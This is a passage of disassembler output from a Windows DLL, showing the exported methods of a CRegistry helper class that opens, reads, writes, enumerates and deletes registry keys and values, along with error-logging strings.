		call	ds:_set_purecall_handler
		pop	ecx

loc_6AF48158:				; CODE XREF: Ordinal985+7j
		and	dword ptr [esi+8], 0
		pop	esi
		retn
Ordinal985	endp


; =============== S U B	R O U T	I N E =======================================


; void __cdecl Handler()
Handler		proc near		; DATA XREF: Ordinal984+8o
					; Ordinal986+19o
		mov	ecx, dword_6AF68260
		test	ecx, ecx
		jz	short locret_6AF4816D
		mov	eax, [ecx]
		jmp	dword ptr [eax+4]
; ---------------------------------------------------------------------------

locret_6AF4816D:			; CODE XREF: Handler+8j
		retn
Handler		endp

; Exported entry 983.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal983
Ordinal983	proc near		; CODE XREF: Ordinal555+6j
					; sub_6AF481C5+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5D78C
		call	Ordinal985
		and	dword_6AF68260,	0
		retn
Ordinal983	endp

; Exported entry 984.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal984
Ordinal984	proc near		; CODE XREF: Ordinal562+1E6p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal985
		push	offset Handler	; Handler
		call	ds:_set_purecall_handler
		mov	[esi+4], eax
		xor	eax, eax
		inc	eax
		pop	ecx
		mov	[esi+8], eax
		pop	esi
		retn
Ordinal984	endp

; Exported entry 986.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal986
Ordinal986	proc near		; CODE XREF: Ordinal556+1Dj
					; DATA XREF: .rdata:6AF5D790o ...

var_8		= dword	ptr -8

		mov	eax, [ecx+4]
		test	eax, eax
		jz	short loc_6AF481A9
		jmp	eax
; ---------------------------------------------------------------------------

loc_6AF481A9:				; CODE XREF: Ordinal986+5j
		push	esi
		mov	esi, ds:_set_purecall_handler
		push	0		; Handler
		call	esi ; _set_purecall_handler
		call	_purecall
		mov	[esp+8+var_8], offset Handler
		call	esi ; _set_purecall_handler
		pop	ecx
		pop	esi
		retn
Ordinal986	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF481C5(void *, char)
sub_6AF481C5	proc near		; DATA XREF: .rdata:off_6AF5D78Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal983
		test	[esp+4+arg_0], 1
		jz	short loc_6AF481DB
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF481DB:				; CODE XREF: sub_6AF481C5+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF481C5	endp

; Exported entry 988.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal988
Ordinal988	proc near		; CODE XREF: Ordinal131+Ap
					; Ordinal132+Ap ...
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5D794
		retn
Ordinal988	endp

; Exported entry 994.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal994
Ordinal994	proc near		; CODE XREF: Ordinal998+1Dp
					; Ordinal999+8p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4820A
		push	eax		; hKey
		call	RegCloseKey
		and	dword ptr [esi+4], 0
		mov	[esi+8], eax

loc_6AF4820A:				; CODE XREF: Ordinal994+8j
		xor	eax, eax
		cmp	[esi+8], eax
		pop	esi
		setz	al
		retn
Ordinal994	endp

; Exported entry 995.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal995(LPCSTR pszSubKey)
		public Ordinal995
Ordinal995	proc near		; CODE XREF: Ordinal147+2C4p
					; Ordinal708+44p
					; DATA XREF: ...

pszSubKey	= dword	ptr  4

		mov	eax, [esp+pszSubKey]
		test	eax, eax
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF48224
		mov	eax, offset dword_6AF5BCB0

loc_6AF48224:				; CODE XREF: Ordinal995+9j
		push	eax		; pszSubKey
		push	dword ptr [esi+4] ; hkey
		call	ds:SHDeleteKeyA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	4
Ordinal995	endp

; Exported entry 996.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal996(LPCSTR pszSubKey)
		public Ordinal996
Ordinal996	proc near		; DATA XREF: .rdata:off_6AF66098o

pszSubKey	= dword	ptr  4

		mov	eax, [esp+pszSubKey]
		test	eax, eax
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF4824E
		mov	eax, offset dword_6AF5BCB0

loc_6AF4824E:				; CODE XREF: Ordinal996+9j
		push	eax		; pszSubKey
		push	dword ptr [esi+4] ; hkey
		call	ds:SHDeleteEmptyKeyA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	4
Ordinal996	endp

; Exported entry 998.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal998
Ordinal998	proc near		; CODE XREF: Ordinal989+15p
					; Ordinal991+7p ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		test	edi, edi
		mov	esi, ecx
		jnz	short loc_6AF48283
		push	offset aCregistryAttac ; "CRegistry::Attach() :	hKey ==	NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF48290
; ---------------------------------------------------------------------------

loc_6AF48283:				; CODE XREF: Ordinal998+Aj
		mov	ecx, esi
		call	Ordinal994
		xor	eax, eax
		mov	[esi+4], edi
		inc	eax

loc_6AF48290:				; CODE XREF: Ordinal998+19j
		pop	edi
		pop	esi
		retn	4
Ordinal998	endp

; Exported entry 999.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal999
Ordinal999	proc near		; CODE XREF: Ordinal997+7p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, [ecx+4]
		and	dword ptr [ecx+4], 0
		call	Ordinal994
		mov	eax, esi
		pop	esi
		retn
Ordinal999	endp

; Exported entry 1000.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1000(LPCSTR lpValueName)
		public Ordinal1000
Ordinal1000	proc near		; CODE XREF: Ordinal1099+68p
					; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  4

		push	esi
		push	[esp+4+lpValueName] ; lpValueName
		mov	esi, ecx
		push	dword ptr [esi+4] ; hKey
		call	RegDeleteValueA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	4
Ordinal1000	endp

; Exported entry 1002.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1002(LPCSTR lpValueName,	LPBYTE lpData, LPDWORD lpcbData)
		public Ordinal1002
Ordinal1002	proc near		; CODE XREF: Ordinal131+3Bp
					; Ordinal183+46p ...

Type		= dword	ptr -4
lpValueName	= dword	ptr  8
lpData		= dword	ptr  0Ch
lpcbData	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+Type], 0
		push	esi
		push	[ebp+lpcbData]	; lpcbData
		lea	eax, [ebp+Type]
		push	[ebp+lpData]	; lpData
		mov	esi, ecx
		push	eax		; lpType
		push	0		; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		push	dword ptr [esi+4] ; hKey
		call	RegQueryValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		leave
		retn	0Ch
Ordinal1002	endp

; Exported entry 1005.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1005(LPCSTR lpValueName,	LPCSTR lpData, DWORD dwType)
		public Ordinal1005
Ordinal1005	proc near		; CODE XREF: Ordinal707+196p
					; Ordinal1004+Ap ...

lpValueName	= dword	ptr  4
lpData		= dword	ptr  8
dwType		= dword	ptr  0Ch

		push	esi
		push	[esp+4+lpData]	; lpString
		mov	esi, ecx
		call	ds:lstrlenA
		inc	eax
		push	eax		; cbData
		push	[esp+8+lpData]	; lpData
		push	[esp+0Ch+dwType] ; dwType
		push	0		; Reserved
		push	[esp+14h+lpValueName] ;	lpValueName
		push	dword ptr [esi+4] ; hKey
		call	RegSetValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	0Ch
Ordinal1005	endp

; Exported entry 1008.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1008(LPCSTR lpValueName,	LPBYTE lpData)
		public Ordinal1008
Ordinal1008	proc near		; CODE XREF: Ordinal144+185p
					; Ordinal144+1DEp ...

Type		= dword	ptr -8
cbData		= dword	ptr -4
lpValueName	= dword	ptr  8
lpData		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+Type], 0
		push	esi
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		push	[ebp+lpData]	; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		push	0		; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		mov	esi, ecx
		push	dword ptr [esi+4] ; hKey
		mov	[ebp+cbData], 4
		call	RegQueryValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		leave
		retn	8
Ordinal1008	endp

; Exported entry 1009.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1009(LPCSTR lpValueName,	BYTE Data)
		public Ordinal1009
Ordinal1009	proc near		; CODE XREF: Ordinal707+1AAp
					; Ordinal1011j
					; DATA XREF: ...

lpValueName	= dword	ptr  4
Data		= byte ptr  8

		push	esi
		push	4		; cbData
		lea	eax, [esp+8+Data]
		push	eax		; lpData
		push	4		; dwType
		push	0		; Reserved
		push	[esp+14h+lpValueName] ;	lpValueName
		mov	esi, ecx
		push	dword ptr [esi+4] ; hKey
		call	RegSetValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	8
Ordinal1009	endp

; Exported entry 1011.
; Exported entry 1013.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1011
Ordinal1011	proc near		; CODE XREF: Ordinal147+78p
					; Ordinal147+90p ...
		jmp	Ordinal1009	; ccL30_1011
Ordinal1011	endp

; Exported entry 1010.
; Exported entry 1012.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1010(LPCSTR lpValueName,	int)
		public Ordinal1010
Ordinal1010	proc near		; CODE XREF: Ordinal144+BDp
					; Ordinal144+D1p ...

Data		= byte ptr -4
lpValueName	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp		; ccL30_1010
		mov	ebp, esp
		push	ecx
		and	dword ptr [ebp+Data], 0
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	[ebp+lpValueName] ; lpValueName
		call	Ordinal1008
		test	eax, eax
		jz	short loc_6AF483C2
		mov	eax, [ebp+arg_4]
		mov	ecx, dword ptr [ebp+Data]
		mov	[eax], ecx
		xor	eax, eax
		inc	eax
		jmp	short locret_6AF483C4
; ---------------------------------------------------------------------------

loc_6AF483C2:				; CODE XREF: Ordinal1010+16j
		xor	eax, eax

locret_6AF483C4:			; CODE XREF: Ordinal1010+23j
		leave
		retn	8
Ordinal1010	endp

; Exported entry 1014.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1014(LPCSTR lpValueName,	LPBYTE lpData)
		public Ordinal1014
Ordinal1014	proc near		; DATA XREF: .rdata:off_6AF66098o

Type		= dword	ptr -8
cbData		= dword	ptr -4
lpValueName	= dword	ptr  8
lpData		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+Type], 0
		push	esi
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		push	[ebp+lpData]	; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		push	0		; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		mov	esi, ecx
		push	dword ptr [esi+4] ; hKey
		mov	[ebp+cbData], 8
		call	RegQueryValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		leave
		retn	8
Ordinal1014	endp

; Exported entry 1015.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1015(LPCSTR lpValueName,	BYTE Data, int)
		public Ordinal1015
Ordinal1015	proc near		; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  4
Data		= byte ptr  8

		push	esi
		push	8		; cbData
		lea	eax, [esp+8+Data]
		push	eax		; lpData
		push	0Bh		; dwType
		push	0		; Reserved
		push	[esp+14h+lpValueName] ;	lpValueName
		mov	esi, ecx
		push	dword ptr [esi+4] ; hKey
		call	RegSetValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	0Ch
Ordinal1015	endp

; Exported entry 1016.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1016(DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
		public Ordinal1016
Ordinal1016	proc near		; CODE XREF: Ordinal144+304p
					; DATA XREF: .rdata:off_6AF66098o

dwIndex		= dword	ptr  8
lpValueName	= dword	ptr  0Ch
lpcchValueName	= dword	ptr  10h
lpReserved	= dword	ptr  14h
lpType		= dword	ptr  18h
lpData		= dword	ptr  1Ch
lpcbData	= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+lpcbData]	; lpcbData
		mov	esi, ecx
		push	[ebp+lpData]	; lpData
		push	[ebp+lpType]	; lpType
		push	[ebp+lpReserved] ; lpReserved
		push	[ebp+lpcchValueName] ; lpcchValueName
		push	[ebp+lpValueName] ; lpValueName
		push	[ebp+dwIndex]	; dwIndex
		push	dword ptr [esi+4] ; hKey
		call	RegEnumValueA
		mov	[esi+8], eax
		pop	esi
		pop	ebp
		retn	1Ch
Ordinal1016	endp

; Exported entry 1017.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1017(DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved,	LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime)
		public Ordinal1017
Ordinal1017	proc near		; DATA XREF: .rdata:off_6AF66098o

dwIndex		= dword	ptr  8
lpName		= dword	ptr  0Ch
lpcchName	= dword	ptr  10h
lpReserved	= dword	ptr  14h
lpClass		= dword	ptr  18h
lpcchClass	= dword	ptr  1Ch
lpftLastWriteTime= dword ptr  20h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+lpftLastWriteTime]	; lpftLastWriteTime
		mov	esi, ecx
		push	[ebp+lpcchClass] ; lpcchClass
		push	[ebp+lpClass]	; lpClass
		push	[ebp+lpReserved] ; lpReserved
		push	[ebp+lpcchName]	; lpcchName
		push	[ebp+lpName]	; lpName
		push	[ebp+dwIndex]	; dwIndex
		push	dword ptr [esi+4] ; hKey
		call	RegEnumKeyExA
		mov	[esi+8], eax
		pop	esi
		pop	ebp
		retn	1Ch
Ordinal1017	endp

; Exported entry 1018.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1018(LPCSTR lpValueName,	LPDWORD	lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
		public Ordinal1018
Ordinal1018	proc near		; CODE XREF: Ordinal953+107p
					; Ordinal953+15Fp
					; DATA XREF: ...

lpValueName	= dword	ptr  8
lpReserved	= dword	ptr  0Ch
lpType		= dword	ptr  10h
lpData		= dword	ptr  14h
lpcbData	= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+lpcbData]	; lpcbData
		mov	esi, ecx
		push	[ebp+lpData]	; lpData
		push	[ebp+lpType]	; lpType
		push	[ebp+lpReserved] ; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		push	dword ptr [esi+4] ; hKey
		call	RegQueryValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		pop	ebp
		retn	14h
Ordinal1018	endp

; Exported entry 1019.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1019(LPCSTR lpValueName,	DWORD Reserved,	DWORD dwType, BYTE *lpData, DWORD cbData)
		public Ordinal1019
Ordinal1019	proc near		; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  8
Reserved	= dword	ptr  0Ch
dwType		= dword	ptr  10h
lpData		= dword	ptr  14h
cbData		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+cbData]	; cbData
		mov	esi, ecx
		push	[ebp+lpData]	; lpData
		push	[ebp+dwType]	; dwType
		push	[ebp+Reserved]	; Reserved
		push	[ebp+lpValueName] ; lpValueName
		push	dword ptr [esi+4] ; hKey
		call	RegSetValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		pop	ebp
		retn	14h
Ordinal1019	endp

; Exported entry 1020.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1020(LPCSTR lpValueName,	LPBYTE lpData, LPDWORD lpcbData)
		public Ordinal1020
Ordinal1020	proc near		; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  4
lpData		= dword	ptr  8
lpcbData	= dword	ptr  0Ch

		push	esi
		push	[esp+4+lpcbData] ; lpcbData
		mov	esi, ecx
		push	[esp+8+lpData]	; lpData
		push	0		; lpType
		push	0		; lpReserved
		push	[esp+14h+lpValueName] ;	lpValueName
		push	dword ptr [esi+4] ; hKey
		call	RegQueryValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	0Ch
Ordinal1020	endp

; Exported entry 1021.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1021(LPCSTR lpValueName,	BYTE *lpData, DWORD cbData)
		public Ordinal1021
Ordinal1021	proc near		; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  4
lpData		= dword	ptr  8
cbData		= dword	ptr  0Ch

		push	esi
		push	[esp+4+cbData]	; cbData
		mov	esi, ecx
		push	[esp+8+lpData]	; lpData
		push	3		; dwType
		push	0		; Reserved
		push	[esp+14h+lpValueName] ;	lpValueName
		push	dword ptr [esi+4] ; hKey
		call	RegSetValueExA
		xor	ecx, ecx
		test	eax, eax
		setz	cl
		mov	[esi+8], eax
		pop	esi
		mov	eax, ecx
		retn	0Ch
Ordinal1021	endp

; Exported entry 989.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal989
Ordinal989	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5D794
		call	Ordinal998
		mov	eax, esi
		pop	esi
		retn	4
Ordinal989	endp

; Exported entry 990.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal990
Ordinal990	proc near		; CODE XREF: Ordinal131+56p
					; Ordinal132+53p ...
		mov	dword ptr [ecx], offset	off_6AF5D794
		jmp	Ordinal994
Ordinal990	endp

; Exported entry 991.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal991
Ordinal991	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal998
		mov	eax, esi
		pop	esi
		retn	4
Ordinal991	endp

; Exported entry 993.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal993(HKEY	hKey, LPCSTR Args, REGSAM samDesired, int)
		public Ordinal993
Ordinal993	proc near		; CODE XREF: Ordinal131+24p
					; Ordinal132+24p ...

hKey		= dword	ptr  8
Args		= dword	ptr  0Ch
samDesired	= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal994
		lea	ebx, [esi+4]
		push	ebx		; phkResult
		push	[ebp+samDesired] ; samDesired
		xor	edi, edi
		push	edi		; ulOptions
		push	[ebp+Args]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	RegOpenKeyExA
		cmp	eax, edi
		mov	[esi+8], eax
		jz	short loc_6AF485E6
		cmp	[ebp+arg_C], edi
		jnz	short loc_6AF485B5
		push	eax
		push	[ebp+Args]
		push	offset aCregistryOpenR ; "CRegistry::Open() : RegOpenKeyEx() !=	E"...
		jmp	short loc_6AF485DA
; ---------------------------------------------------------------------------

loc_6AF485B5:				; CODE XREF: Ordinal993+2Dj
		push	edi		; lpdwDisposition
		push	ebx		; phkResult
		push	edi		; lpSecurityAttributes
		push	[ebp+samDesired] ; samDesired
		push	edi		; dwOptions
		push	edi		; lpClass
		push	edi		; Reserved
		push	[ebp+Args]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	RegCreateKeyExA
		cmp	eax, edi
		mov	[esi+8], eax
		jz	short loc_6AF485E6
		push	eax
		push	[ebp+Args]	; Args
		push	offset aCregistryOpe_1 ; "CRegistry::Open() : RegCreateKeyEx() !="...

loc_6AF485DA:				; CODE XREF: Ordinal993+38j
		call	sub_6AF3102E
		add	esp, 0Ch
		xor	eax, eax
		jmp	short loc_6AF485ED
; ---------------------------------------------------------------------------

loc_6AF485E6:				; CODE XREF: Ordinal993+28j
					; Ordinal993+54j
		xor	eax, eax
		cmp	[ebx], edi
		setnz	al

loc_6AF485ED:				; CODE XREF: Ordinal993+69j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	10h
Ordinal993	endp

; Exported entry 997.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal997
Ordinal997	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		call	Ordinal999
		push	eax
		mov	ecx, esi
		call	Ordinal998
		pop	esi
		retn	4
Ordinal997	endp

; Exported entry 1004.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1004(LPCSTR lpValueName,	LPCSTR lpData)
		public Ordinal1004
Ordinal1004	proc near		; CODE XREF: Ordinal1098+B5p
					; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  4
lpData		= dword	ptr  8

		push	1		; dwType
		push	[esp+4+lpData]	; lpData
		push	[esp+8+lpValueName] ; lpValueName
		call	Ordinal1005
		retn	8
Ordinal1004	endp

; Exported entry 1007.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1007(LPCSTR lpValueName,	int, DWORD dwType)
		public Ordinal1007
Ordinal1007	proc near		; CODE XREF: Ordinal1006+Ap
					; DATA XREF: .rdata:off_6AF66098o

lpValueName	= dword	ptr  4
arg_4		= dword	ptr  8
dwType		= dword	ptr  0Ch

		push	[esp+dwType]	; dwType
		mov	eax, [esp+4+arg_4]
		mov	eax, [eax]
		push	eax		; lpData
		push	[esp+8+lpValueName] ; lpValueName
		call	Ordinal1005
		retn	0Ch
Ordinal1007	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF48635(void *, char)
sub_6AF48635	proc near		; DATA XREF: .rdata:off_6AF5D794o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5D794
		call	Ordinal994
		test	[esp+4+arg_0], 1
		jz	short loc_6AF48651
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF48651:				; CODE XREF: sub_6AF48635+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF48635	endp

; Exported entry 1006.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1006(LPCSTR lpValueName,	int)
		public Ordinal1006
Ordinal1006	proc near		; CODE XREF: Ordinal147+151p
					; Ordinal147+1EEp
					; DATA XREF: ...

lpValueName	= dword	ptr  4
arg_4		= dword	ptr  8

		push	1		; dwType
		push	[esp+4+arg_4]	; int
		push	[esp+8+lpValueName] ; lpValueName
		call	Ordinal1007
		retn	8
Ordinal1006	endp

; Exported entry 1003.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1003(LPCSTR lpValueName,	int)
		public Ordinal1003
Ordinal1003	proc near		; CODE XREF: Ordinal132+38p
					; Ordinal144+171p ...

var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= byte ptr -50h
var_30		= dword	ptr -30h
Type		= dword	ptr -2Ch
cbData		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
lpValueName	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_100	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 4Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, RegQueryValueExA
		mov	[ebp+var_10], esp
		mov	[ebp+var_14], eax
		xor	ebx, ebx
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		push	ebx		; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		push	ebx		; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		mov	esi, ecx
		push	dword ptr [esi+4] ; hKey
		mov	[ebp+var_30], esi
		mov	[ebp+Type], ebx
		mov	[ebp+cbData], ebx
		call	edi ; RegQueryValueExA
		cmp	eax, ebx
		mov	[esi+8], eax
		jz	short loc_6AF486B7
		xor	eax, eax
		jmp	loc_6AF487B8
; ---------------------------------------------------------------------------

loc_6AF486B7:				; CODE XREF: Ordinal1003+45j
		push	offset aCregistryGetst ; "CRegistry::GetString()"
		lea	ecx, [ebp+var_50]
		call	Ordinal751
		push	[ebp+cbData]
		mov	ecx, [ebp+arg_4]
		mov	[ebp+var_4], ebx
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31911
		lea	ecx, [ebp+cbData]
		push	ecx		; lpcbData
		push	eax		; lpData
		lea	eax, [ebp+Type]
		push	eax		; lpType
		push	ebx		; lpReserved
		push	[ebp+lpValueName] ; lpValueName
		push	dword ptr [esi+4] ; hKey
		call	edi ; RegQueryValueExA
		mov	[esi+8], eax
		jmp	loc_6AF4878D
; ---------------------------------------------------------------------------

loc_6AF486F0:				; DATA XREF: .rdata:6AF63AB0o
		push	13h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	ecx, [ebp+var_54]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF48788
		retn
; ---------------------------------------------------------------------------

loc_6AF48733:				; DATA XREF: .rdata:6AF63AC0o
		push	15h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	eax, [ebp+var_58]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF48788
		retn
; ---------------------------------------------------------------------------

loc_6AF48788:				; DATA XREF: Ordinal1003+C4o
					; Ordinal1003+119o
		mov	esi, [ebp+var_30]
		xor	ebx, ebx

loc_6AF4878D:				; CODE XREF: Ordinal1003+82j
		mov	ecx, [ebp+arg_4]
		push	0FFFFFFFFh
		mov	[ebp+var_4], ebx
		call	sub_6AF3531D
		lea	ecx, [ebp+var_50]
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF487AE
		cmp	[esi+8], ebx
		setz	al
		mov	ebx, eax

loc_6AF487AE:				; CODE XREF: Ordinal1003+13Bj
		lea	ecx, [ebp+var_50]
		call	Ordinal752
		mov	eax, ebx

loc_6AF487B8:				; CODE XREF: Ordinal1003+49j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal1003	endp ; sp-analysis failed

; Exported entry 1022.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1022
Ordinal1022	proc near		; CODE XREF: Ordinal557+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5D864
		mov	dword_6AF68264,	eax
		retn
Ordinal1022	endp

; Exported entry 1025.

